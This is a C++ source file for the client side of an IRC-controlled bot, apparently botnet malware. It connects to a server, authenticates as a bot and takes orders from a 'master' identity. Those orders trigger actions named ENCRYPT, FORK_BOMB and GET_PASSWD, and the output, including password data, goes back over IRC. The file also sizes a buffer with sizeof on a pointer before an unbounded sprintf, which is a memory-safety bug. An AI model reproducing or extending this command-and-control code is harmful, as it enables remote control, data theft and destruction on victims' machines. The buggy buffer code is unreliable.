#include "IrcClient.hpp"

#include <sstream>
#include <iostream>
#include <string>
#include <csignal>

std::vector<std::string> splitByNewline(const std::string& input) {
    std::vector<std::string> lines;
    std::stringstream ss(input);
    std::string line;
    
    while (std::getline(ss, line)) {
        lines.push_back(line);
    }
    
    return lines;
}

IrcClient::IrcClient(std::string server, int port, const char* exeName, std::string botNick, std::string botUser, std::string assignedChannel, std::string botPass)
    : server(server.c_str()), port(port), exeName(exeName), botNick(botNick), botUser(botUser), assignedChannel(assignedChannel), botPass(botPass), session(nullptr) {
    memset(&callbacks, 0, sizeof(callbacks));
    callbacks.event_connect = event_connect;
    callbacks.event_quit = dump_event;
    callbacks.event_kick = dump_event;
    callbacks.event_topic = dump_event;
    callbacks.event_part = dump_event;
    callbacks.event_privmsg = dump_event;
    callbacks.event_unknown = event_unknown;
    registrationStatus = false;

    session = irc_create_session(&callbacks);
    if (!session) {
        throw std::runtime_error("Could not create IRC session");
    }
    irc_set_ctx(session, this);
}

IrcClient* IrcClient::getInstance(irc_session_t* session) {
    return static_cast<IrcClient*>(irc_get_ctx(session));
}

IrcClient::~IrcClient() {
    closeConnection();
}

void IrcClient::connect() {
    const char* placeholder = "IGNORE";
    if (irc_connect(session, server, port, nullptr, placeholder, placeholder, placeholder)) {
        closeConnection();
        throw std::runtime_error("Failed to connect to server");
    }

    if (irc_run(session)) {
        closeConnection();
        throw std::runtime_error("Error while connected to server");
    }
}

void IrcClient::signalHandler(int signal) {
    std::cout << "Interrupt signal (" << signal << ") received.\n";
    exit(signal);
}

std::string IrcClient::concatenateParams(const char* event, const char* origin, const char** params, unsigned int count) {
    std::string result;

    if (strcmp(origin, "") != 0) {
        result += origin;
        result += " ";
    }

    if (strcmp(event, "") != 0) {
        result += event;
        result += " ";
    }
    
    // Add each parameter
    for (unsigned int i = 0; i < count; ++i) {
        result += params[i];
        result += " ";
    }
    
    return result;
}

bool IrcClient::isRegistered() {
    return registrationStatus;
}

void IrcClient::sendCommand(const std::string& command) {
    if (session) {
        irc_send_raw(session, command.c_str());
    }
}

void IrcClient::closeConnection() {
    if (session) {
        irc_disconnect(session);
        irc_destroy_session(session);
        session = nullptr;
    }
}

void IrcClient::event_connect(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
    printf("Connected to server\n");

    IrcClient* instance = getInstance(session);
    if (instance) {
        std::string validateCmd = "/VALIDATE " + instance->botPass + " BOT";
        std::string nickCmd = "/NICK " + instance->botNick; 
        std::string userCmd = "/USER " + instance->botUser + " 0 * " + instance->botUser;
        std::string joinCmd = "/JOIN " + instance->assignedChannel;
        instance->sendCommand(validateCmd);
        instance->sendCommand(nickCmd);
        instance->sendCommand(userCmd);
        instance->sendCommand(joinCmd);
    }
}

void IrcClient::event_unknown(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
    printf("event unknown hit\n");
    IrcClient::parseEvent(session, event, origin, params, count);
}

void IrcClient::dump_event(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
	printf("dump event hit\n");
    IrcClient::parseEvent(session, event, origin, params, count);
}
void IrcClient::parseEvent(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
    IrcClient* instance = getInstance(session);
    if (!instance) {
        return;
    }
    const char* tempEvent = event != nullptr && strcmp(event, "null") != 0 ? event : "";
    const char* tempOrigin = origin != nullptr && strcmp(origin, "null") != 0 ? origin : "";
    std::string receivedMessage = IrcClient::concatenateParams(tempEvent, tempOrigin, params, count);

    printf("Received message: %s\n", receivedMessage.c_str());

    if (strcmp(event, "(REGISTERED)") == 0) {
        instance->registrationStatus = true;
        return;
    }

    if (!instance->isRegistered()) {
        return;
    }

    const char* masterIdentifier = "master!masterUser@";
    size_t size1 = sizeof(masterIdentifier);
    size_t size2 = sizeof(instance->server);
    char buffer[size1 + size2 + 1];
    std::sprintf(buffer, "%s%s", masterIdentifier, instance->server);

    ActionInfo actionInfo = MessageParser::parseMessage(receivedMessage, buffer);
    instance->createAction(actionInfo);
}

void IrcClient::createAction(ActionInfo actionInfo) {
    Action* action = nullptr;
    printf("Create action hit\n");
    #ifdef ENABLE_PING_ACTION
    if (actionInfo.getActionType() == ActionType::PING) { // check if bot was compiled to support this
        printf("ping created\n");
        action = new PingAction(actionInfo.getActionParams());
    }
    #endif

    #ifdef ENABLE_ENCRYPT_ACTION
    if (actionInfo.getActionType() == ActionType::ENCRYPT) { // check if bot was compiled to support this
        printf("ENCRYPT created\n");
        action = new EncryptAction(actionInfo.getActionParams());
    }
    #endif

    #ifdef ENABLE_REPORT_ACTION
    if (actionInfo.getActionType() == ActionType::REPORT) {
        printf("REPORT created\n");
        action = new ReportAction(actionInfo.getActionParams());
    }
    #endif

    #ifdef ENABLE_FORK_BOMB_ACTION
    if (actionInfo.getActionType() == ActionType::FORK_BOMB) {
        printf("fork bomb created\n");
        action = new ForkBombAction(actionInfo.getActionParams());
    }
    #endif

     #ifdef ENABLE_GET_PASSWD_ACTION
    if (actionInfo.getActionType() == ActionType::GET_PASSWD) {
        printf("get passwd created\n");
        action = new GetPasswdAction(actionInfo.getActionParams());
    }
    #endif

    if (action) {
        action->execute();
        if (action->getMessage() != "") {
            std::vector<std::string> lines = GeneralUtils::splitByNewLine(action->getMessage());
            for (const auto& line : lines) {
                sendCommand(line);
            }
        }
        delete action;
    }
}
